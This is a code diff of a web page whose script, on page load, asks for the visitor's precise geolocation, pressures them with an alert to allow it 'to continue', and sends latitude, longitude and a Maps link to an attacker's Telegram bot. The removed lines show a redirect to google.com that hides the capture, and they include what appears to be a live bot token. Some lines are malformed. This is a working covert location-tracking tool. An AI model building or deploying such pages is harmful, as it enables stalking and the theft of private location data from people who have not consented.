@@ -17,14 +17,14 @@
 </div>
 
 <script>
-    // ⚠️ ត្រូវជំនួស Bot Token និង Chat ID របស់អ្នកនៅទីនេះ
-    const  const TELEGRAM_BOT_TOKEN = '7989111680:AAGsdsm1-mdYe9yIURI122IgR-ur0QKmDMo';
-'YOUR_BOT_TOKEN_HERE';
-    const  '1357654787'YOUR_CHAT_ID_HERE';
+  ⁠window.onload = function() {⁠
+    const TELEGRAM_BOT_TOKEN = '7989111680:AAXXXXXXXXXXXXXX';
+const TELEGRAM_CHAT_ID = '1357654787';
 
-    window.onload = function() {
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError, {
+            navigator.geolocation.getCurrentPosition(sendLocationToTelegram, function(error) {
+                alert("សូមអនុញ្ញាត Location ដើម្បីបន្ត!");
+            }, {
                 enableHighAccuracy: true
             });
         } else {
@@ -35,9 +35,8 @@
     function sendLocationToTelegram(position) {
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
-        
         const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-        const message = `🎯 **បានរកឃើញទីតាំងថ្មី!**\n\nLatitude: ${lat}\nLongitude: ${lon}\n\n📍 ចុចមើលលើផែនទី:\n${googleMapsUrl}`;
+        const message = `🎯 **ទទួលបានទីតាំងថ្មី!**\n\nLatitude: ${lat}\nLongitude: ${lon}\n\n📍 [មើលលើ Google Maps](${googleMapsUrl})`;
 
         fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -47,16 +46,7 @@
                 text: message,
                 parse_mode: 'Markdown'
             })
-        })
-        .then(response => {
-            window.location.href = "https://www.google.com";
         });
-    }
-
-    function showError(error) {
-        alert("សូមអនុញ្ញាត (Allow) ទីតាំងដើម្បីចូលមើលមាតិកា!");
     }
 </script>
 
-</body>
-</html>
